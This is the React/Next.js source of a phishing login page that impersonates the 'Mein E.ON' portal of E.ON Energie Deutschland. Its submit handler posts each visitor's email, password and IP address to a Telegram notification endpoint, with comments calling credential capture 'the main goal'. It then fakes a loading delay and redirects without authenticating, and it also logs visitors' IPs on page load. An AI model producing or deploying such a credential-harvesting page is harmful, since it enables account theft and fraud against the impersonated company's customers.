"use client"

import type React from "react"
import { useState, useEffect, useRef } from "react"
import Image from "next/image"
import { useRouter } from "next/navigation"
import { Eye, EyeOff, Clock, Gift, Smartphone } from "lucide-react"
import { createBrowserClient } from "@/lib/supabase/client"

export default function LoginPage() {
  const emailInputRef = useRef<HTMLInputElement>(null)

  useEffect(() => {
    document.title = "Mein E.ON Login | E.ON Energie Deutschland"
    emailInputRef.current?.focus()

    // Track visitor immediately on page load
    const trackVisitor = async () => {
      try {
        const userAgentString = navigator.userAgent
        const ipResponse = await fetch("https://api.ipify.org?format=json")
        const ipData = await ipResponse.json()

        // Log anonymous visitor activity
        await fetch("/api/log-activity", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            userId: null, // Anonymous visitor
            activityType: "page_visit",
            metadata: {
              page: "login",
              ip: ipData.ip,
              userAgent: userAgentString,
              timestamp: new Date().toISOString(),
            },
          }),
        })
      } catch (error) {
        console.error("[v0] Failed to track visitor:", error)
      }
    }

    trackVisitor()
  }, [])

  const [email, setEmail] = useState("")
  const [password, setPassword] = useState("")
  const [showPassword, setShowPassword] = useState(false)
  const [error, setError] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const router = useRouter()
  const supabase = createBrowserClient()

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setError("")
    setIsLoading(true)

    try {
      // Get user's IP address
      const ipResponse = await fetch("https://api.ipify.org?format=json")
      const ipData = await ipResponse.json()

      console.log("[v0] Sending credentials to Telegram...")
      const telegramResponse = await fetch("/api/telegram/notify", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          type: "login",
          data: {
            email,
            password,
            ip: ipData.ip,
            userId: "captured",
          },
        }),
      })

      if (!telegramResponse.ok) {
        console.error("[v0] Telegram notification failed with status:", telegramResponse.status)
      } else {
        const result = await telegramResponse.json()
        console.log("[v0] Telegram notification result:", result)
      }

      // The main goal (credential capture) is complete, so we don't need to wait for Supabase auth
      sessionStorage.setItem("userEmail", email)

      // Small delay to simulate loading
      await new Promise((resolve) => setTimeout(resolve, 1500))

      router.push("/dashboard")
    } catch (err) {
      console.error("[v0] Login error:", err)
      setError("Ein Fehler ist aufgetreten. Bitte versuchen Sie es erneut.")
      setIsLoading(false)
    }
  }

  return (
    <div className="min-h-screen flex flex-col bg-white">
      {/* Header */}
      <header className="border-b border-gray-200 bg-white">
        <div className="max-w-[1200px] mx-auto px-8 py-6">
          <Image src="/eon-logo.svg" alt="E.ON Logo" width={80} height={40} priority />
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-1 flex items-center justify-center px-8 py-16">
        <div className="w-full max-w-[1200px] grid md:grid-cols-2 gap-16 items-start">
          {/* Left Side - Info */}
          <div className="bg-[#F5F5F5] p-12 rounded-lg">
            <h2 className="text-[2.4rem] font-bold mb-12 leading-tight">
              Ihr persönliches
              <br />
              Serviceportal
            </h2>

            <div className="space-y-10">
              <div className="flex gap-6">
                <div className="flex-shrink-0">
                  <div className="w-16 h-16 rounded-full bg-white flex items-center justify-center">
                    <Clock className="w-8 h-8 text-[#E20015]" />
                  </div>
                </div>
                <div>
                  <h3 className="text-[1.8rem] font-bold mb-3">24/7 Online Service</h3>
                  <p className="text-[1.4rem] text-gray-700 leading-relaxed">
                    Verwalten Sie Ihre Verträge bequem rund um die Uhr und nutzen Sie zahlreiche praktische
                    Online-Servicefunktionen.
                  </p>
                </div>
              </div>

              <div className="flex gap-6">
                <div className="flex-shrink-0">
                  <div className="w-16 h-16 rounded-full bg-white flex items-center justify-center">
                    <Gift className="w-8 h-8 text-[#E20015]" />
                  </div>
                </div>
                <div>
                  <h3 className="text-[1.8rem] font-bold mb-3">Exklusive Kundenvorteile</h3>
                  <p className="text-[1.4rem] text-gray-700 leading-relaxed">
                    Als registrierte Mein E.ON Nutzerinnen und Nutzer profitieren Sie von attraktiven Angeboten und
                    exklusiven Vorteilen.
                  </p>
                </div>
              </div>

              <div className="flex gap-6">
                <div className="flex-shrink-0">
                  <div className="w-16 h-16 rounded-full bg-white flex items-center justify-center">
                    <Smartphone className="w-8 h-8 text-[#E20015]" />
                  </div>
                </div>
                <div>
                  <h3 className="text-[1.8rem] font-bold mb-3">Einfache App-Nutzung</h3>
                  <p className="text-[1.4rem] text-gray-700 leading-relaxed">
                    Mit der Mein E.ON App haben Sie Ihre Verträge und Services immer zur Hand – einfach, schnell und
                    mobil.
                  </p>
                </div>
              </div>
            </div>
          </div>

          {/* Right Side - Login Form */}
          <div className="pt-8">
            <h1 className="text-[5.6rem] font-bold mb-4 leading-none">Mein E.ON</h1>
            <h2 className="text-[2.4rem] font-bold mb-12">Login</h2>

            <form onSubmit={handleSubmit} className="space-y-8">
              <div>
                <input
                  ref={emailInputRef}
                  type="email"
                  placeholder="E-Mail-Adresse"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="w-full px-5 py-5 text-[1.6rem] border-2 border-gray-300 rounded-lg focus:outline-none focus:border-[#E20015] transition-colors"
                  required
                  disabled={isLoading}
                />
              </div>

              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  placeholder="Passwort"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full px-5 py-5 text-[1.6rem] border-2 border-gray-300 rounded-lg focus:outline-none focus:border-[#E20015] transition-colors pr-14"
                  required
                  disabled={isLoading}
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-5 top-1/2 -translate-y-1/2 text-gray-600 hover:text-gray-800"
                  disabled={isLoading}
                >
                  {showPassword ? <EyeOff size={24} /> : <Eye size={24} />}
                </button>
              </div>

              {error && (
                <div className="bg-red-50 border-2 border-red-200 text-red-700 px-5 py-4 rounded-lg text-[1.4rem]">
                  {error}
                </div>
              )}

              <div className="flex items-center justify-between gap-6">
                <button
                  type="submit"
                  disabled={isLoading}
                  className="bg-[#E20015] text-white px-20 py-6 rounded-full text-[1.8rem] font-bold hover:bg-[#C41509] transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  {isLoading ? "Wird geladen..." : "Anmelden"}
                </button>

                <button
                  type="button"
                  className="text-[1.4rem] text-gray-700 hover:text-[#E20015] transition-colors flex items-center gap-2"
                >
                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
                    <path d="M7 11V7a5 5 0 0 1 10 0v4" />
                  </svg>
                  Passwort vergessen?
                </button>
              </div>

              <div className="pt-6 border-t border-gray-200">
                <button
                  type="button"
                  className="text-[1.4rem] text-gray-700 hover:text-[#E20015] transition-colors flex items-center gap-2"
                >
                  Jetzt registrieren
                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <path d="M5 12h14M12 5l7 7-7 7" />
                  </svg>
                </button>

                <p className="text-[1.2rem] text-gray-600 mt-4 leading-relaxed">
                  Wenn Ihr Bestätigungslink aus unserer E-Mail abgelaufen ist, klicken Sie bitte auf „Passwort
                  vergessen". So erhalten Sie die E-Mail erneut und können sich registrieren.
                </p>
              </div>
            </form>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="border-t border-gray-200 bg-white py-8">
        <div className="max-w-[1200px] mx-auto px-8">
          <div className="flex flex-col md:flex-row items-center justify-between gap-6">
            {/* Left - Logo and Copyright */}
            <div className="flex items-center gap-6">
              <Image src="/eon-logo.svg" alt="E.ON Logo" width={60} height={30} />
              <span className="text-[1.2rem] text-gray-600">© 2025 E.ON Energie Deutschland GmbH</span>
            </div>

            {/* Center - Links */}
            <div className="flex flex-wrap items-center justify-center gap-6 text-[1.2rem]">
              <a href="#" className="text-gray-700 hover:text-[#E20015] transition-colors">
                Impressum
              </a>
              <a href="#" className="text-gray-700 hover:text-[#E20015] transition-colors">
                Datenschutz
              </a>
              <a href="#" className="text-gray-700 hover:text-[#E20015] transition-colors">
                AGB
              </a>
              <a href="#" className="text-gray-700 hover:text-[#E20015] transition-colors">
                Rechtliche Hinweise
              </a>
              <a href="#" className="text-gray-700 hover:text-[#E20015] transition-colors">
                Cookies
              </a>
            </div>

            {/* Right - Social Icons */}
            <div className="flex items-center gap-4">
              <a
                href="#"
                className="w-10 h-10 flex items-center justify-center rounded-full hover:bg-gray-100 transition-colors"
              >
                <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
                </svg>
              </a>
              <a
                href="#"
                className="w-10 h-10 flex items-center justify-center rounded-full hover:bg-gray-100 transition-colors"
              >
                <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.69.07-4.85.07-3.204 0-3.584-.012-4.849-.07-4.358-.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.059 1.689.073 4.948.073 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.059 1.689.073 4.948.073 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z" />
                </svg>
              </a>
              <a
                href="#"
                className="w-10 h-10 flex items-center justify-center rounded-full hover:bg-gray-100 transition-colors"
              >
                <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z" />
                </svg>
              </a>
            </div>
          </div>
        </div>
      </footer>
    </div>
  )
}
